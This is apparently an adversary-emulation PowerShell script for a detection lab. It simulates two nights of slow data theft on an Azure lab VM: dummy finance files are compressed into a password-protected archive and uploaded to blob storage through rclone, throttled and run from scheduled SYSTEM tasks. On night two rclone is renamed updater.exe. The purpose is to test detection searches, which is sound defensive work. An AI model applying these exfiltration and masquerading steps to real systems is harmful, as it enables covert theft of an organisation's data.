param(
    [string]$ResourceGroup = 'rg-uc3-lab',
    [string]$MainVm = 'opca-wks-01',
    [string]$StorageAccount,
    [string]$At = '23:00',
    [switch]$Now,
    [switch]$Cleanup
)
# LAB VMs ONLY. Attack Detection lab test 10, "Slow data theft" (2 nights). Run in Azure PowerShell (Cloud Shell),
# signed in to the subscription that holds the lab VMs. It runs inside the VM through Azure Run Command (as SYSTEM).
#
#   ./Test-10-SlowDataTheft.ps1           1. makes a storage account for the uploads in the resource group (or uses
#                                            -StorageAccount), with a container "uploads" and a 7-day write address;
#                                         2. on opca-wks-01: downloads rclone (rclone.org) and 7-Zip's 7za (7-zip.org)
#                                            if missing, makes 500 MB of dummy files, and schedules two nights at -At
#                                            (23:00 VM time; Azure VMs run on UTC): night 1 packs them into a
#                                            password-protected C:\PerfLogs\data_0412.7z and uploads it with rclone,
#                                            night 2 uploads it again with rclone renamed updater.exe.
#                                         Searches 1, 2, 5, 7 and 8 should hit after night 2.
#   ./Test-10-SlowDataTheft.ps1 -Now      both nights straight away (search 7, uploads at night, may then not hit).
#   ./Test-10-SlowDataTheft.ps1 -Cleanup -StorageAccount <name>
#                                         removes the files and tasks in the VM, and deletes that storage account.

$ErrorActionPreference = 'Stop'

function Invoke-OnVm([string]$Vm, [string]$Script) {
    $file = Join-Path ([IO.Path]::GetTempPath()) "attacklab-$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -Path $file -Value $Script -Encoding UTF8
    try {
        Write-Host "Running on $Vm through Azure Run Command (a few minutes)..." -ForegroundColor Cyan
        $result = Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroup -VMName $Vm -CommandId RunPowerShellScript -ScriptPath $file
        foreach ($v in $result.Value) { if ($v.Message) { Write-Host $v.Message } }
    } finally { Remove-Item $file -ErrorAction SilentlyContinue }
}

# the two nights; they travel as base64, so the VM stores them exactly as written
$night1 = @'
& C:\Tools\bin\7za.exe a -pLabTest-0412 C:\PerfLogs\data_0412.7z C:\Shares\Finance\Export\* | Out-Null
& C:\Tools\bin\rclone.exe copy C:\PerfLogs\data_0412.7z lab:uploads --config C:\Tools\rclone.conf --bwlimit 1M
'@
$night2 = @'
Copy-Item C:\Tools\bin\rclone.exe C:\ProgramData\SysHealth\updater.exe -Force
& C:\ProgramData\SysHealth\updater.exe copy C:\PerfLogs\data_0412.7z lab:uploads --config C:\Tools\rclone.conf --bwlimit 1M --ignore-times
'@

$prepare = @'
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$bin = 'C:\Tools\bin'
New-Item $bin, C:\ProgramData\SysHealth, C:\PerfLogs, C:\Shares\Finance\Export -ItemType Directory -Force | Out-Null
if (-not (Test-Path "$bin\rclone.exe")) {
    Invoke-WebRequest https://downloads.rclone.org/rclone-current-windows-amd64.zip -OutFile "$env:TEMP\rclone.zip" -UseBasicParsing
    Expand-Archive "$env:TEMP\rclone.zip" "$env:TEMP\rclone" -Force
    Copy-Item (Get-ChildItem "$env:TEMP\rclone" -Recurse -Filter rclone.exe | Select-Object -First 1).FullName "$bin\rclone.exe"
    Write-Output '[done] rclone downloaded from rclone.org'
}
if (-not (Test-Path "$bin\7za.exe")) {
    Invoke-WebRequest https://www.7-zip.org/a/7zr.exe -OutFile "$bin\7zr.exe" -UseBasicParsing
    Invoke-WebRequest https://www.7-zip.org/a/7z2409-extra.7z -OutFile "$env:TEMP\7z-extra.7z" -UseBasicParsing
    & "$bin\7zr.exe" x "$env:TEMP\7z-extra.7z" "-o$env:TEMP\7z-extra" -y | Out-Null
    Copy-Item "$env:TEMP\7z-extra\7za.exe" "$bin\7za.exe"
    Write-Output '[done] 7-Zip 7za downloaded from 7-zip.org'
}
& "$bin\rclone.exe" config create lab azureblob sas_url '__SAS__' --config C:\Tools\rclone.conf | Out-Null
Write-Output '[done] rclone points at the lab storage'
$b = New-Object byte[] 10MB
$r = New-Object Random
1..50 | ForEach-Object { $r.NextBytes($b); [IO.File]::WriteAllBytes("C:\Shares\Finance\Export\ledger_$_.xlsx", $b) }
Write-Output '[done] 500 MB of dummy files in C:\Shares\Finance\Export'
$nights = @{ 1 = '__NIGHT1__'; 2 = '__NIGHT2__' }
foreach ($n in 1, 2) {
    $file = "C:\ProgramData\SysHealth\night$n.ps1"
    Set-Content $file ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($nights[$n])))
    if ('__NOW__' -eq 'yes') { & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $file; Write-Output "[done] night $n run now"; continue }
    $at = [datetime]::Today.Add([timespan]'__AT__').AddDays($n - 1); if ($at -lt (Get-Date)) { $at = $at.AddDays(1) }
    $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-NoProfile -ExecutionPolicy Bypass -File $file"
    Register-ScheduledTask "SysHealthNight$n" -Action $action -Trigger (New-ScheduledTaskTrigger -Once -At $at) -User SYSTEM -RunLevel Highest -Force | Out-Null
    Write-Output "[done] night $n scheduled for $($at.ToString('ddd HH:mm')) VM time"
}
'@

$cleanupVm = @'
$ErrorActionPreference = 'Continue'
foreach ($n in 1, 2) { Unregister-ScheduledTask "SysHealthNight$n" -Confirm:$false -ErrorAction SilentlyContinue
                       Remove-Item "C:\ProgramData\SysHealth\night$n.ps1" -Force -ErrorAction SilentlyContinue }
Remove-Item C:\PerfLogs\data_0412.7z, C:\ProgramData\SysHealth\updater.exe, C:\Tools\rclone.conf -Force -ErrorAction SilentlyContinue
Remove-Item C:\Shares\Finance\Export -Recurse -Force -ErrorAction SilentlyContinue
Write-Output '[done] archive, dummy files, renamed rclone, rclone settings and the night tasks removed'
'@

if ($Cleanup) {
    Invoke-OnVm $MainVm $cleanupVm
    if ($StorageAccount) { Remove-AzStorageAccount -ResourceGroupName $ResourceGroup -Name $StorageAccount -Force; Write-Host "Storage account $StorageAccount deleted." }
    return
}

if (-not $StorageAccount) {
    $StorageAccount = 'labexfil' + (-join ((97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
    $location = (Get-AzVM -ResourceGroupName $ResourceGroup -Name $MainVm).Location
    New-AzStorageAccount -ResourceGroupName $ResourceGroup -Name $StorageAccount -Location $location -SkuName Standard_LRS -Kind StorageV2 | Out-Null
    Write-Host "Made storage account $StorageAccount for the uploads (delete it afterwards with -Cleanup -StorageAccount $StorageAccount)."
}
$ctx = (Get-AzStorageAccount -ResourceGroupName $ResourceGroup -Name $StorageAccount).Context
if (-not (Get-AzStorageContainer -Name uploads -Context $ctx -ErrorAction SilentlyContinue)) { New-AzStorageContainer -Name uploads -Context $ctx | Out-Null }
$sas = New-AzStorageContainerSASToken -Name uploads -Context $ctx -Permission racwl -ExpiryTime (Get-Date).AddDays(7) -FullUri

$b64 = { param($s) [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)) }
Invoke-OnVm $MainVm $prepare.Replace('__SAS__', $sas).Replace('__NIGHT1__', (& $b64 $night1)).Replace('__NIGHT2__', (& $b64 $night2)).Replace('__AT__', $At).Replace('__NOW__', $(if ($Now) { 'yes' } else { 'no' }))
Write-Host "`nAfter night 2, wait 15-60 minutes, then run the Attack Detection Agent: one data-theft story on $MainVm."
